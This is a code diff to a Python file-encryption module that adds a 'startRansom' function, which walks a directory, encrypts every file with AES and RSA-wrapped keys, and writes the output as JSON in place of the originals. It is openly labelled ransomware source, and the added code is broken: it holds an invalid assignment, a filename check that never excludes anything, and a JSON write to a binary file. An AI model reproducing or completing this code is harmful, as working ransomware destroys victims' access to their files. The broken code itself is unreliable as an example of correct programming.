@@ -1,4 +1,4 @@
-import os, base64, constants, rsakeys
+import os, base64, constants, rsakeys, json
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding, hashes, hmac, serialization, asymmetric
@@ -134,6 +134,7 @@ def myFileEncryptMAC(filepath):
 		return (cipherFile, iv, tag, enc_key, hmac_key, fileExt)
 
 
+# RSA Encrypt using AES CBC 256 Encryption with HMAC 
 def myRSAEncrypt(filepath, RSA_Publickey_filepath):
 
 	(cipherFile, iv, tag, enc_key, hmac_key, fileExt) = myFileEncryptMAC(filepath)
@@ -157,6 +158,36 @@ def myRSAEncrypt(filepath, RSA_Publickey_filepath):
 		key_file.close()
 	return (RSACipher, cipherFile, iv, tag, fileExt) 
 
+
+def startRansom():
+	rsakeys.createDirectory("keys")
+	keyFolder = os.path.join(os.getcwd(),"keys")
+	rsakeys.createKeyPair(keyFolder)
+	privateKeyPath = os.path.join(keyFolder, "private_key")
+	publicKeyPath = os.path.join(keyFolder, "public_key")
+
+	for dirName, subDirList, fileList in os.walk("encryptThis"):
+		print('Found directory: %s' % dirName)
+		for fileName in fileList:
+			if(fileName != 'encryption.py' or fileName != 'decryption.py' or fileName != 'rsakeys.py' or fileName != 'constants.py'):
+				
+				createJSON(fileName, RSACipher, cipherFile, iv, tag, fileExt) = myRSAEncrypt(os.path.join(dirName,fileName), publicKeyPath)
+				
+				print('\t%s' % fileName)
+
+
+# Create a JSON file
+def createJSON(fileName, RSACipher, cipherFile, iv, tag, fileExt):
+	data = {}
+	data["fileName"] = fileName
+	data["RSACipher"] = RSACipher
+	data["cipherFile"] = cipherFile
+	data["iv"] = iv
+	data["tag"] = tag
+	data["fileExt"] = fileExt
+	
+	with open(fileName, 'wb') as file:
+		json.dump(data, file) 
 
 # AES requires plain text and ciphertext to be a multiple of 16
 # We pad it so that the message is a multiple of the IV, 16
